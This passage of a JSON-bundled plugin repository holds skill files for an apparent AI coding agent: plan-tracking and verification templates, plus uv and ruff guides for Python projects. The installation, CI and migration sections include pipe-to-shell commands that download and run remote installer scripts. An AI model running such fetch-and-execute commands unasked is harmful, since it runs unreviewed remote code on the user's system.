Progress | ETA |\n|-------|------|--------|----------|-----|\n| 01 | Foundation | [x] | 100% |  |\n| 02 | Core Features | [~] | 66% | 2h |\n| 03 | Enhancement | [ ] | 0% | 4h |\n| 04 | Polish | [ ] | 0% | 1h |\n\n## Progress\n**Overall:** 2/4 phases complete (50%)\n**Current:** Phase 02 in progress\n**Next:** Phase 03 (waiting for 02)\n```\n\n### Visual Indicators\n\n```markdown\nStatus Icons:\n[ ] Pending (not started)\n[~] In Progress (executing)\n[x] Complete (finished successfully)\n[!] Blocked (needs intervention)\n```\n\n## State Management Checklist\n\n### Phase Lifecycle\n\n- [ ] Phase started (status [ ]  [~])\n- [ ] Tasks executing (status updates)\n- [ ] Tasks completed (status [~]  [x])\n- [ ] Phase completed (status [~]  [x])\n- [ ] Summary created\n- [ ] Next phase ready\n\n### Handoff Lifecycle\n\n- [ ] Blocker identified\n- [ ] Handoff created (status [~]  [!])\n- [ ] State saved\n- [ ] Resolution applied\n- [ ] Handoff verified resolved\n- [ ] Phase resumed (status [!]  [~])\n\n### Recovery Lifecycle\n\n- [ ] Interruption detected\n- [ ] State recovered\n- [ ] Handoff status checked\n- [ ] Execution resumed or paused\n- [ ] Progress continued\n",
        "plugins/sys-builder/skills/managing-plans/references/verification-workflows.md": "# Verification Workflows\n\n## Overview\n\nVerification Workflows ensure that tasks, phases, and plans are completed correctly and meet success criteria.\n\n## Verification Levels\n\n### Level 1: Task Verification\n\n**Purpose:** Verify individual tasks are completed correctly\n\n**Scope:**\n- Task execution output\n- Files created/modified\n- Tests passing\n- Success criteria met\n\n**Process:**\n```markdown\n1. Execute task (via Worker agent)\n2. Collect execution output\n3. Verify against success criteria\n4. Check file changes\n5. Run verification commands\n6. Update task status\n```\n\n**Example: Task Verification**\n\n```markdown\nTask: Create user registration form\nAction: Create React component with validation\n\nVerification Steps:\n1. Check component file created: \n2. Verify validation logic: \n3. Test form submission: \n4. Check styling: \n5. Validate against success criteria: \n\nSuccess Criteria:\n- Component renders without errors\n- Form validates email/password\n- Submit button disabled until valid\n- Error messages display correctly\n\nResult: GOOD Task Complete\n```\n\n**Task Verification Template:**\n\n```markdown\n# Task Verification: {task-name}\n\n## Execution Output\n```\n{raw output from worker agent}\n```\n\n## Verification Checks\n\n### File Changes\n- [ ] {expected file 1} created/modified\n- [ ] {expected file 2} created/modified\n- [ ] {expected file 3} created/modified\n\n### Code Quality\n- [ ] No syntax errors\n- [ ] Linting passes\n- [ ] Type checking passes (if applicable)\n\n### Tests\n- [ ] Unit tests pass\n- [ ] Integration tests pass\n- [ ] Test coverage maintained\n\n### Success Criteria\n- [ ] {criteria 1}\n- [ ] {criteria 2}\n- [ ] {criteria 3}\n\n## Result\n**Status:** GOOD Complete / BAD Failed\n\n**Notes:**\n{Any observations or issues}\n```\n\n### Level 2: Phase Verification\n\n**Purpose:** Verify phase completion and deliverables\n\n**Scope:**\n- All tasks complete\n- Phase deliverables produced\n- Success criteria met\n- Documentation updated\n\n**Process:**\n```markdown\n1. Verify all tasks [x] complete\n2. Check phase deliverables\n3. Validate against phase objectives\n4. Run integration tests\n5. Create phase summary\n6. Update ROADMAP.md\n```\n\n**Phase Verification Checklist:**\n\n```markdown\n## Phase Completion Checklist\n\n### Tasks\n- [ ] All tasks marked [x]\n- [ ] No pending tasks\n- [ ] No blocked tasks\n\n### Deliverables\n- [ ] {deliverable 1} produced\n- [ ] {deliverable 2} produced\n- [ ] {deliverable 3} produced\n\n### Quality\n- [ ] All tests passing\n- [ ] No critical bugs\n- [ ] Code review complete (if applicable)\n- [ ] Documentation updated\n\n### Success Criteria\n- [ ] {phase objective 1}\n- [ ] {phase objective 2}\n- [ ] {phase objective 3}\n\n### Integration\n- [ ] Integrates with previous phases\n- [ ] No breaking changes\n- [ ] Dependencies satisfied\n\n## Result\n**Status:** GOOD Phase Complete / BAD Phase Incomplete\n\n**Next:** {next phase or action}\n```\n\n**Phase Summary Template:**\n\n```markdown\n# Phase {XX} Summary: {phase-name}\n\n**Date:** {YYYY-MM-DD}\n**Duration:** {X hours}\n**Status:** GOOD Complete\n\n## Completed Tasks\n- [x] {Task 1} - {description}\n- [x] {Task 2} - {description}\n- [x] {Task 3} - {description}\n\n## Deliverables\n1. **{Deliverable 1}**\n   - Location: {path}\n   - Description: {what it is}\n\n2. **{Deliverable 2}**\n   - Location: {path}\n   - Description: {what it is}\n\n## Key Decisions\n- **Decision 1:** {what was decided}  {rationale}\n- **Decision 2:** {what was decided}  {rationale}\n\n## Challenges Overcome\n- **Challenge 1:** {description}  {solution}\n- **Challenge 2:** {description}  {solution}\n\n## Quality Metrics\n- **Tests:** {X}/{Y} passing ({Z}% coverage)\n- **Linting:** GOOD Pass\n- **Type Checking:** GOOD Pass\n- **Build:** GOOD Success\n\n## Integration Status\n- **Previous Phase:** Compatible GOOD\n- **Next Phase:** Ready to start GOOD\n\n## Lessons Learned\n- {learning 1}\n- {learning 2}\n\n## Next Steps\n{What needs to happen next}\n```\n\n### Level 3: Plan Verification\n\n**Purpose:** Verify complete plan success\n\n**Scope:**\n- All phases complete\n- All deliverables produced\n- Success criteria met\n- System functional end-to-end\n\n**Process:**\n```markdown\n1. Verify all phases [x] complete\n2. Check all deliverables\n3. Run end-to-end tests\n4. Validate success criteria\n5. Create final report\n6. Mark plan complete\n```\n\n**Plan Verification Checklist:**\n\n```markdown\n# Plan Verification: {project-name}\n\n## Phase Completion\n- [x] Phase 1: {name} - Complete\n- [x] Phase 2: {name} - Complete\n- [x] Phase 3: {name} - Complete\n- [x] Phase 4: {name} - Complete\n\n## Deliverables\n- [x] {deliverable 1}\n- [x] {deliverable 2}\n- [x] {deliverable 3}\n\n## Success Criteria\n### Functional\n- [x] {functional criteria 1}\n- [x] {functional criteria 2}\n- [x] {functional criteria 3}\n\n### Non-Functional\n- [x] Performance: {meets requirements}\n- [x] Security: {no vulnerabilities}\n- [x] Usability: {user-friendly}\n- [x] Maintainability: {documented}\n\n## End-to-End Testing\n- [x] User journey 1 works\n- [x] User journey 2 works\n- [x] User journey 3 works\n\n## Quality Assurance\n- [x] All tests passing\n- [x] No critical bugs\n- [x] Documentation complete\n- [x] Code review complete\n\n## Deployment\n- [x] Build successful\n- [x] Deployment ready\n- [x] Rollback plan documented\n\n## Final Status\n**Overall Status:** GOOD SUCCESS\n\n**Completion Date:** {YYYY-MM-DD}\n**Total Duration:** {X days}\n\n## Success Metrics\n- **On Time:** GOOD / BAD\n- **On Budget:** GOOD / BAD\n- **All Requirements Met:** GOOD / BAD\n- **Quality Standards Met:** GOOD / BAD\n```\n\n## Automated Verification\n\n### Self-Verification Pattern\n\n**Automated Task Verification:**\n\n```python\ndef verify_task(task, execution_report):\n    \"\"\"Automatically verify task completion\"\"\"\n\n    results = {\n        'files_created': [],\n        'tests_passed': [],\n        'criteria_met': [],\n        'errors': []\n    }\n\n    # Check 1: Expected files\n    for expected_file in task.get('expected_files', []):\n        if os.path.exists(expected_file):\n            results['files_created'].append(expected_file)\n        else:\n            results['errors'].append(f\"Missing file: {expected_file}\")\n\n    # Check 2: Tests\n    if task.get('run_tests'):\n        test_result = run_tests()\n        if test_result.success:\n            results['tests_passed'].append('All tests')\n        else:\n            results['errors'].append(f\"Tests failed: {test_result.output}\")\n\n    # Check 3: Success criteria\n    for criteria in task.get('success_criteria', []):\n        if verify_criteria(criteria):\n            results['criteria_met'].append(criteria)\n        else:\n            results['errors'].append(f\"Criteria not met: {criteria}\")\n\n    # Determine result\n    success = len(results['errors']) == 0\n\n    return {\n        'success': success,\n        'results': results,\n        'verification_report': format_verification_report(results)\n    }\n```\n\n**Automated Phase Verification:**\n\n```python\ndef verify_phase(phase_id):\n    \"\"\"Automatically verify phase completion\"\"\"\n\n    phase_plan = read_phase_plan(phase_id)\n\n    # Check all tasks complete\n    all_complete = all(\n        task.status == '[x]'\n        for task in phase_plan.tasks\n    )\n\n    if not all_complete:\n        return {\n            'success': False,\n            'reason': 'Not all tasks complete'\n        }\n\n    # Verify deliverables\n    deliverables_verified = verify_deliverables(\n        phase_plan.deliverables\n    )\n\n    # Run integration tests\n    integration_tests_pass = run_integration_tests()\n\n    # Check phase objectives\n    objectives_met = verify_phase_objectives(phase_plan)\n\n    success = (\n        deliverables_verified and\n        integration_tests_pass and\n        objectives_met\n    )\n\n    return {\n        'success': success,\n        'all_tasks_complete': all_complete,\n        'deliverables_verified': deliverables_verified,\n        'integration_tests_pass': integration_tests_pass,\n        'objectives_met': objectives_met\n    }\n```\n\n### Verification Commands\n\n**Common Verification Commands:**\n\n```bash\n# Code Quality\nnpm run lint          # ESLint\nnpm run type-check    # TypeScript\nnpm run format       # Prettier\n\n# Testing\nnpm test             # Unit tests\nnpm run test:e2e     # End-to-end tests\nnpm run test:coverage # Coverage report\n\n# Building\nnpm run build        # Production build\nnpm run build:test   # Test build\n\n# Security\nnpm audit           # Dependency audit\nnpm run security-scan # Security scan\n\n# Performance\nnpm run lighthouse   # Performance audit\nnpm run bundle-analyzer # Bundle size analysis\n```\n\n## Verification Reporting\n\n### Verification Report Template\n\n```markdown\n# Verification Report: {component-name}\n\n**Date:** {YYYY-MM-DD}\n**Level:** {Task/Phase/Plan}\n**Status:** GOOD Pass / BAD Fail\n\n## Summary\n{Brief summary of verification results}\n\n## Detailed Results\n\n### Checks Performed\n1. {check 1} - GOOD Pass / BAD Fail\n2. {check 2} - GOOD Pass / BAD Fail\n3. {check 3} - GOOD Pass / BAD Fail\n\n### Metrics\n- **Files Created:** {X}/{Y}\n- **Tests Passing:** {X}/{Y}\n- **Coverage:** {X}%\n- **Build Status:** GOOD Success / BAD Failed\n\n### Issues Found\n- {issue 1} - {severity}\n- {issue 2} - {severity}\n\n### Recommendations\n1. {recommendation 1}\n2. {recommendation 2}\n\n## Next Steps\n- [ ] {action 1}\n- [ ] {action 2}\n- [ ] {action 3}\n```\n\n### Verification Metrics\n\n**Task Metrics:**\n```markdown\n- Task completion time\n- Verification time\n- Number of retries\n- Success rate\n- Error rate\n```\n\n**Phase Metrics:**\n```markdown\n- Phase duration\n- Task completion rate\n- Deliverable quality score\n- Test pass rate\n- Integration success\n```\n\n**Plan Metrics:**\n```markdown\n- Plan completion rate\n- Success criteria met\n- Overall quality score\n- Time to completion\n- Budget adherence\n```\n\n## Quick Reference\n\n### Verification Checklist\n\n**Every Task:**\n- [ ] Execution output captured\n- [ ] Files created/modified verified\n- [ ] Tests passing\n- [ ] Success criteria met\n- [ ] Status updated\n\n**Every Phase:**\n- [ ] All tasks complete\n- [ ] Deliverables produced\n- [ ] Integration tests pass\n- [ ] Phase summary created\n- [ ] ROADMAP.md updated\n\n**Every Plan:**\n- [ ] All phases complete\n- [ ] All deliverables present\n- [ ] End-to-end tests pass\n- [ ] Success criteria met\n- [ ] Final report created\n\n### Verification Commands\n\n```bash\n# Quick verification\nnpm run lint && npm test && npm run build\n\n# Full verification\nnpm run lint && npm test && npm run test:e2e && npm audit\n\n# Performance verification\nnpm run lighthouse && npm run bundle-analyzer\n```\n\n### Verification Tools\n\n- **Linting:** ESLint, flake8, black\n- **Testing:** Jest, Pytest, Vitest\n- **Type Checking:** TypeScript, mypy\n- **Security:** npm audit, bandit, semgrep\n- **Performance:** Lighthouse, web-vitals\n- **Coverage:** Istanbul, coverage.py\n\n## Self-Verification Pattern\n\n**Automated Verification:**\n\n```python\ndef verify_task_completion(task, execution_report):\n    \"\"\"Verify task was completed successfully\"\"\"\n\n    # Check 1: Expected files created\n    expected_files = task.get('expected_files', [])\n    for file in expected_files:\n        assert os.path.exists(file), f\"Expected file {file} not found\"\n\n    # Check 2: Tests passing\n    if task.get('run_tests'):\n        result = run_command('npm test')\n        assert result.returncode == 0, \"Tests failed\"\n\n    # Check 3: Success criteria\n    success_criteria = task.get('success_criteria', [])\n    for criteria in success_criteria:\n        assert verify_criteria(criteria), f\"Criteria not met: {criteria}\"\n\n    return True\n```\n\n**Verification Checklist:**\n\n```markdown\nFor Each Task:\n- [ ] Files created as expected\n- [ ] Code changes applied correctly\n- [ ] Tests passing\n- [ ] Success criteria met\n- [ ] No errors in execution\n- [ ] State updated correctly\n\nFor Each Phase:\n- [ ] All tasks complete\n- [ ] Phase summary created\n- [ ] ROADMAP.md updated\n- [ ] Next phase ready\n\nFor Plan:\n- [ ] All phases complete\n- [ ] Deliverables produced\n- [ ] Final verification passed\n- [ ] Success criteria met\n```\n",
        "plugins/sys-builder/skills/managing-python/SKILL.md": "---\nname: managing-python\ndescription: \"Manages Python environments, dependencies, and tools using uv and ruff. PROACTIVELY Use when setting up Python projects, adding dependencies, managing virtual environments, or enforcing code quality standards. MUST Use `uv` for all operations.\"\nuser-invocable: false\nallowed-tools: [Bash, Read, Write, Edit]\n---\n\n# UV & Ruff: Modern Python Development\n\n\n\n## Quick Decision Tree\n\n```\nNeed to install/manage Python packages?\n   uv add <package>          # Add dependency\n   uv sync                   # Install from lockfile\n   uv run <command>          # Run in project env\n\nNeed to lint or format Python code?\n   ruff check .              # Lint\n   ruff check --fix .        # Lint + auto-fix\n   ruff format .             # Format\n\nNeed to manage Python versions?\n   uv python install 3.12    # Install Python\n   uv python pin 3.12        # Pin for project\n\nNeed to run a CLI tool once?\n   uvx <tool>                # e.g., uvx black .\n```\n\n## Installation\n\n```bash\n# UV (macOS/Linux)\ncurl -LsSf https://astral.sh/uv/install.sh | sh\n\n# UV (Windows PowerShell)\npowershell -ExecutionPolicy ByPass -c \"irm https://astral.sh/uv/install.ps1 | iex\"\n\n# Ruff (via uv - recommended)\nuv tool install ruff\n\n# Verify\nuv version && ruff version\n```\n\n## Essential Commands\n\n### UV Project Management\n\n```bash\n# Initialize project\nuv init my-project && cd my-project\n\n# Dependencies\nuv add requests pandas           # Production deps\nuv add --dev pytest ruff         # Dev deps\nuv remove requests               # Remove dep\nuv lock --upgrade                # Update lockfile\n\n# Run commands (no activation needed)\nuv run python main.py\nuv run pytest\nuv run ruff check .\n\n# Python versions\nuv python install 3.11 3.12\nuv python pin 3.12\nuv run --python 3.11 python script.py\n```\n\n### Ruff Linting & Formatting\n\n```bash\n# Lint\nruff check .                     # Check errors\nruff check --fix .               # Auto-fix\nruff check --diff .              # Preview fixes\nruff check --watch               # Continuous mode\n\n# Format\nruff format .                    # Format files\nruff format --check .            # Check only\nruff format --diff .             # Preview changes\n\n# Combined workflow\nruff check --fix . && ruff format .\n```\n\n## Configuration\n\n### pyproject.toml (Minimal)\n\n```toml\n[project]\nname = \"my-project\"\nversion = \"0.1.0\"\nrequires-python = \">=3.11\"\ndependencies = [\n    \"requests>=2.31.0\",\n]\n\n[tool.uv]\ndev-dependencies = [\n    \"pytest>=7.0.0\",\n    \"ruff>=0.1.0\",\n]\n\n[tool.ruff]\nline-length = 88\ntarget-version = \"py311\"\n\n[tool.ruff.lint]\nselect = [\"E\", \"W\", \"F\", \"I\", \"B\", \"UP\"]\nignore = [\"E501\"]\n\n[tool.ruff.lint.per-file-ignores]\n\"__init__.py\" = [\"F401\"]\n\"tests/*\" = [\"S101\"]\n```\n\n### Pre-commit Hook\n\n```yaml\n# .pre-commit-config.yaml\nrepos:\n  - repo: https://github.com/astral-sh/ruff-pre-commit\n    rev: v0.12.8\n    hooks:\n      - id: ruff\n        args: [--fix]\n      - id: ruff-format\n```\n\n## Rule Sets Quick Reference\n\n| Code | Name | Purpose |\n|:-----|:-----|:--------|\n| E/W | pycodestyle | PEP 8 style |\n| F | Pyflakes | Logic errors |\n| I | isort | Import sorting |\n| B | flake8-bugbear | Common bugs |\n| UP | pyupgrade | Modern syntax |\n| S | flake8-bandit | Security |\n| T20 | flake8-print | Print statements |\n\n**Recommended starter set:** `select = [\"E\", \"W\", \"F\", \"I\", \"B\", \"UP\"]`\n\n## Suppress Errors\n\n```python\nimport os  # noqa: F401           # Ignore specific rule\nimport sys  # noqa                # Ignore all rules\n# ruff: noqa: E501               # File-level ignore\n```\n\n## CI/CD Snippet (GitHub Actions)\n\n```yaml\n- name: Install uv\n  run: curl -LsSf https://astral.sh/uv/install.sh | sh\n\n- name: Install and lint\n  run: |\n    uv sync --frozen\n    uv run ruff check .\n    uv run ruff format --check .\n    uv run pytest\n```\n\n## Troubleshooting\n\n```bash\n# Clear caches\nuv cache clean\nruff clean\n\n# Debug configuration\nruff check --show-settings .\n\n# Reinstall Python\nrm -r \"$(uv python dir)\" && uv python install 3.12\n\n# Reset lockfile\nrm uv.lock && uv lock\n```\n\n## Detailed References\n\nLoad these for comprehensive guidance:\n\n| Reference | Content |\n|:----------|:--------|\n| `references/uv-guide.md` | Complete uv documentation: projects, Python versions, building, publishing |\n| `references/ruff-guide.md` | All 800+ rules, formatting options, editor integration |\n| `references/migration.md` | Migrating from pip, conda, poetry, Flake8, Black, isort |\n| `references/workflows.md` | Monorepos, Docker, CI/CD, production deployments |\n\n\n",
        "plugins/sys-builder/skills/managing-python/references/migration.md": "# Migration Guide: UV and Ruff\n\n## From pip + virtualenv  UV\n\n### Before\n\n```bash\npython -m venv .venv\nsource .venv/bin/activate\npip install -r requirements.txt\npython main.py\n```\n\n### After\n\n```bash\nuv init .\nuv add $(cat requirements.txt | grep -v '^#' | tr '\\n' ' ')\nuv run python main.py\n```\n\n### Convert requirements.txt  pyproject.toml\n\n```toml\n[project]\nname = \"my-project\"\nversion = \"0.1.0\"\nrequires-python = \">=3.11\"\ndependencies = [\n    \"requests>=2.31.0\",\n    \"pandas>=2.0.0\",\n]\n\n[tool.uv]\ndev-dependencies = [\n    \"pytest>=7.0.0\",\n    \"ruff>=0.1.0\",\n]\n```\n\n### Maintain requirements.txt (Optional)\n\n```bash\nuv export -o requirements.txt\nuv export --group dev -o requirements-dev.txt\n```\n\n## From conda  UV\n\n### Key Differences\n\n| Feature | conda | UV |\n|---------|-------|-----|\n| Speed | Slow | Fast |\n| Non-Python packages |  |  |\n| PyPI packages | Limited | Full |\n| Memory | High | Low |\n\n### Migration Steps\n\n1. **Export conda packages:**\n```bash\nconda env export --from-history > environment.yml\n```\n\n2. **Convert to pyproject.toml:**\n```yaml\n# environment.yml\ndependencies:\n  - python=3.11\n  - numpy=1.24.0\n  - pip:\n    - requests==2.31.0\n```\n\nBecomes:\n\n```toml\n[project]\nrequires-python = \">=3.11\"\ndependencies = [\n    \"numpy>=1.24.0\",\n    \"requests>=2.31.0\",\n]\n```\n\n3. **Remove conda environment:**\n```bash\nconda deactivate\nconda env remove -n myenv\n```\n\n### When to Keep Conda\n\nKeep conda if you need:\n- Non-Python packages (R, Julia, C libraries)\n- Specific binary distributions\n- Legacy scientific computing workflows\n\n## From poetry  UV\n\n### Convert pyproject.toml\n\n**Poetry:**\n```toml\n[tool.poetry]\nname = \"my-project\"\nversion = \"0.1.0\"\n\n[tool.poetry.dependencies]\npython = \"^3.11\"\nrequests = \"^2.31.0\"\n\n[tool.poetry.dev-dependencies]\npytest = \"^7.0.0\"\n\n[build-system]\nrequires = [\"poetry-core\"]\nbuild-backend = \"poetry.core.masonry.api\"\n```\n\n**UV:**\n```toml\n[project]\nname = \"my-project\"\nversion = \"0.1.0\"\nrequires-python = \">=3.11\"\ndependencies = [\"requests>=2.31.0\"]\n\n[tool.uv]\ndev-dependencies = [\"pytest>=7.0.0\"]\n\n[build-system]\nrequires = [\"hatchling\"]\nbuild-backend = \"hatchling.build\"\n```\n\n### Version Constraints\n\n| Poetry | UV/pip |\n|--------|--------|\n| `^2.31.0` | `>=2.31.0,<3.0.0` |\n| `~2.31.0` | `>=2.31.0,<2.32.0` |\n| `*` | (no constraint) |\n\n### Migration Steps\n\n```bash\nrm poetry.lock\nrm -rf .venv\npoetry env remove --all\nuv lock && uv sync\n```\n\n## From pipx  UV Tool\n\n### Migration\n\n```bash\n# List pipx tools\npipx list\n\n# Install with UV\nuv tool install ruff\nuv tool install black\n\n# Remove pipx tools\npipx uninstall-all\n```\n\n### Ephemeral Execution\n\n```bash\n# pipx run equivalent\nuvx ruff check .\nuvx black .\n```\n\n## From Flake8/Black/isort  Ruff\n\n### Configuration Migration\n\n**From .flake8:**\n```ini\n[flake8]\nmax-line-length = 88\nextend-ignore = E203, W503\nexclude = .git,__pycache__\nper-file-ignores =\n    __init__.py:F401\n```\n\n**From pyproject.toml (Black + isort):**\n```toml\n[tool.black]\nline-length = 88\n\n[tool.isort]\nprofile = \"black\"\nknown_first_party = [\"myproject\"]\n```\n\n**To unified Ruff:**\n```toml\n[tool.ruff]\nline-length = 88\n\n[tool.ruff.lint]\nignore = [\"E203\", \"W503\"]\nexclude = [\".git\", \"__pycache__\"]\n\n[tool.ruff.lint.per-file-ignores]\n\"__init__.py\" = [\"F401\"]\n\n[tool.ruff.lint.isort]\nknown-first-party = [\"myproject\"]\n```\n\n### Command Migration\n\n| Before | After |\n|--------|-------|\n| `isort .` | `ruff check --select I --fix .` |\n| `black .` | `ruff format .` |\n| `flake8 .` | `ruff check .` |\n| All three | `ruff check --fix . && ruff format .` |\n\n### Remove Old Tools\n\n```bash\nuv remove --dev black isort flake8\nuv add --dev ruff\n```\n\n### Update pre-commit\n\n**Before:**\n```yaml\nrepos:\n  - repo: https://github.com/PyCQA/isort\n    hooks: [id: isort]\n  - repo: https://github.com/psf/black\n    hooks: [id: black]\n  - repo: https://github.com/PyCQA/flake8\n    hooks: [id: flake8]\n```\n\n**After:**\n```yaml\nrepos:\n  - repo: https://github.com/astral-sh/ruff-pre-commit\n    rev: v0.12.8\n    hooks:\n      - id: ruff\n        args: [--fix]\n      - id: ruff-format\n```\n\n## Complete Migration Checklist\n\n- [ ] Install UV: `curl -LsSf https://astral.sh/uv/install.sh | sh`\n- [ ] Convert requirements.txt  pyproject.toml\n- [ ] Generate lockfile: `uv lock`\n- [ ] Install dependencies: `uv sync`\n- [ ] Add Ruff: `uv add --dev ruff`\n- [ ] Convert linter/formatter config to `[tool.ruff]`\n- [ ] Test: `ruff check . && ruff format .`\n- [ ] Update CI/CD pipelines\n- [ ] Update pre-commit hooks\n- [ ] Remove old tools\n- [ ] Update team documentation\n\n## Typical Results\n\n| Metric | Before | After | Improvement |\n|--------|--------|-------|-------------|\n| Install time | 5 min | 30 sec | 10x faster |\n| Lint time | 15 sec | 0.5 sec | 30x faster |\n| CI/CD time | 10 min | 2 min | 5x faster |\n| Tools to manage | 7 | 2 | 3.5x fewer |\n| Config files | 4 | 1 | 4x simpler |\n",
        "plugins/sys-builder/skills/managing-python/references/ruff-guide.md": "# Ruff Complete Guide\n\nRuff is an extremely fast Python linter and formatter written in Rust. 10-100x faster than Flake8/Black.\n\n## Linting\n\n### Basic Commands\n\n```bash\nruff check .                 # Check directory\nruff check src/main.py       # Check files\nruff check --fix .           # Auto-fix\nruff check --diff .          # Preview fixes\nruff check --watch           # Continuous mode\n```\n\n### Output Formats\n\n```bash\nruff check --output-format json .     # JSON\nruff check --output-format github .   # GitHub Actions\nruff check --output-format gitlab .   # GitLab\nruff check --output-format junit .    # JUnit XML\n```\n\n### Advanced Options\n\n```bash\nruff check --unsafe-fixes .           # Include unsafe fixes\nruff check --fix-only .               # Fix without reporting\nruff check --statistics .             # Show rule stats\nruff check --show-settings .          # Debug config\nruff check --show-files .             # Show files to check\n```\n\n## Formatting\n\n```bash\nruff format .                # Format all\nruff format src/main.py      # Format specific\nruff format --check .        # Check only\nruff format --diff .         # Preview changes\nruff format --preview .      # Enable preview features\n```\n\n### Combined Workflow\n\n```bash\nruff check --fix . && ruff format .\n```\n\n## Configuration\n\n### pyproject.toml\n\n```toml\n[tool.ruff]\nline-length = 88\nindent-width = 4\ntarget-version = \"py311\"\n\nexclude = [\n    \".git\",\n    \".venv\",\n    \"__pycache__\",\n    \"build\",\n    \"dist\",\n]\n\n[tool.ruff.lint]\nselect = [\n    \"E\",   # pycodestyle errors\n    \"W\",   # pycodestyle warnings\n    \"F\",   # Pyflakes\n    \"I\",   # isort\n    \"B\",   # flake8-bugbear\n    \"UP\",  # pyupgrade\n]\n\nignore = [\"E501\"]  # Line too long (formatter handles)\n\nfixable = [\"ALL\"]\nunfixable = []\n\ndummy-variable-rgx = \"^(_+|(_+[a-zA-Z0-9_]*[a-zA-Z0-9]+?))$\"\n\n[tool.ruff.lint.per-file-ignores]\n\"__init__.py\" = [\"F401\"]\n\"tests/*\" = [\"S101\"]\n\"scripts/*\" = [\"T201\"]\n\n[tool.ruff.lint.isort]\nknown-first-party = [\"myproject\"]\ncombine-as-imports = true\n\n[tool.ruff.lint.pydocstyle]\nconvention = \"google\"  # or \"numpy\", \"pep257\"\n\n[tool.ruff.format]\nquote-style = \"double\"\nindent-style = \"space\"\nskip-magic-trailing-comma = false\nline-ending = \"auto\"\ndocstring-code-format = true\n```\n\n## Rule Sets\n\n| Code | Name | Purpose |\n|:-----|:-----|:--------|\n| E | pycodestyle errors | PEP 8 errors |\n| W | pycodestyle warnings | PEP 8 warnings |\n| F | Pyflakes | Logic errors |\n| I | isort | Import sorting |\n| N | pep8-naming | Naming conventions |\n| D | pydocstyle | Docstring style |\n| UP | pyupgrade | Modern Python |\n| B | flake8-bugbear | Common bugs |\n| A | flake8-builtins | Builtin shadowing |\n| C4 | flake8-comprehensions | Comprehensions |\n| T20 | flake8-print | Print statements |\n| PT | flake8-pytest-style | Pytest style |\n| S | flake8-bandit | Security |\n| Q | flake8-quotes | Quote style |\n| RUF | Ruff-specific | Custom rules |\n\n### Selecting Rules\n\n```bash\nruff check --select E,W,F .          # Specific sets\nruff check --select ALL .            # All rules\nruff check --extend-select B,I .     # Add to defaults\nruff check --ignore E501 .           # Ignore specific\n```\n\n### Recommended Combinations\n\n**Minimal:**\n```toml\nselect = [\"E4\", \"E7\", \"E9\", \"F\"]\n```\n\n**Standard:**\n```toml\nselect = [\"E\", \"W\", \"F\", \"I\"]\n```\n\n**Strict:**\n```toml\nselect = [\"E\", \"W\", \"F\", \"I\", \"N\", \"D\", \"UP\", \"B\", \"C4\", \"S\", \"T20\", \"PT\"]\n```\n\n## Error Suppression\n\n### Inline Comments\n\n```python\nimport os  # noqa: F401              # Specific rule\nimport sys, os  # noqa: F401, E401   # Multiple rules\nx = 1  # noqa                        # All rules\n```\n\n### File-Level\n\n```python\n# ruff: noqa: F401, E402\nimport os\n```\n\n### Auto-Add noqa\n\n```bash\nruff check --add-noqa .\n```\n\n## Rule Explainer\n\n```bash\nruff rule E501                       # Explain rule\nruff rule --all                      # List all rules\n```\n\n## Common Rules Explained\n\n### F (Pyflakes)\n- **F401**: Imported but unused\n- **F841**: Variable assigned but never used\n- **F821**: Undefined name\n\n### B (flake8-bugbear)\n- **B006**: Mutable default argument\n- **B008**: Function call in default argument\n- **B011**: Don't use assert False\n\n### UP (pyupgrade)\n- **UP006**: Use `list` instead of `typing.List`\n- **UP032**: Use f-string instead of `.format()`\n\n## Editor Integration\n\n### VS Code\n\n```json\n{\n  \"[python]\": {\n    \"editor.formatOnSave\": true,\n    \"editor.codeActionsOnSave\": {\n      \"source.fixAll.ruff\": \"explicit\",\n      \"source.organizeImports.ruff\": \"explicit\"\n    },\n    \"editor.defaultFormatter\": \"charliermarsh.ruff\"\n  }\n}\n```\n\n### Pre-commit\n\n```yaml\nrepos:\n  - repo: https://github.com/astral-sh/ruff-pre-commit\n    rev: v0.12.8\n    hooks:\n      - id: ruff\n        args: [--fix]\n      - id: ruff-format\n```\n\n## Cache Management\n\n```bash\nruff clean                           # Clear cache\nruff check --no-cache .              # Disable cache\n```\n\n## Migration from Other Tools\n\n### From Flake8\n\n```ini\n# .flake8\n[flake8]\nmax-line-length = 88\nextend-ignore = E203, W503\n```\n\nBecomes:\n\n```toml\n[tool.ruff]\nline-length = 88\n\n[tool.ruff.lint]\nignore = [\"E203\", \"W503\"]\n```\n\n### From Black\n\n```bash\n# Replace\nblack .\n# With\nruff format .\n```\n\n### From isort\n\n```bash\n# Replace\nisort .\n# With\nruff check --select I --fix .\n```\n\n### Complete Migration\n\n**Before (multiple tools):**\n```bash\nisort . && black . && flake8 .\n```\n\n**After (single tool):**\n```bash\nruff check --fix . && ruff format .\n```\n",
        "plugins/sys-builder/skills/managing-python/references/uv-guide.md": "# UV Complete Guide\n\nUV is an extremely fast Python package and project manager written in Rust. 10-100x faster than pip.\n\n## Project Management\n\n### Create and Initialize\n\n```bash\nuv init my-project           # New project\nuv init .                    # Existing directory\n```\n\n**Generated structure:**\n```\nmy-project/\n .gitignore\n .python-version\n README.md\n hello.py\n pyproject.toml\n```\n\n### Run Commands\n\n```bash\nuv run python hello.py       # Run script\nuv run pytest                # Run tool\nuv run --python 3.12 python script.py  # Specific Python\n```\n\n## Dependency Management\n\n### Adding Dependencies\n\n```bash\nuv add requests              # Production\nuv add requests pandas numpy # Multiple\nuv add \"requests>=2.31.0\"    # Version constraint\nuv add --dev pytest ruff     # Development\nuv add --group docs sphinx   # Named group\nuv add git+https://github.com/user/repo.git  # From git\n```\n\n### Managing Dependencies\n\n```bash\nuv remove requests           # Remove\nuv lock --upgrade            # Upgrade all\nuv lock --upgrade-package requests  # Upgrade one\nuv sync                      # Install from lockfile\nuv sync --frozen             # Exact lockfile (CI)\n```\n\n### Dependency Groups\n\n```toml\n[project.optional-dependencies]\ndev = [\"pytest>=7.0.0\", \"ruff>=0.1.0\"]\ndocs = [\"sphinx>=5.0.0\"]\n\n[tool.uv]\ndev-dependencies = [\"black>=23.0.0\"]\n```\n\n```bash\nuv sync --group docs         # Include group\nuv sync --only-group dev     # Only specific group\nuv sync --no-group docs      # Exclude group\n```\n\n### Export\n\n```bash\nuv export -o requirements.txt\nuv export --group dev -o requirements-dev.txt\n```\n\n## Python Version Management\n\n```bash\nuv python install 3.11 3.12 3.13  # Install versions\nuv python list                     # List installed\nuv python list --all-versions      # List available\nuv python pin 3.12                 # Pin for project\n```\n\n## Tool Management\n\n```bash\n# 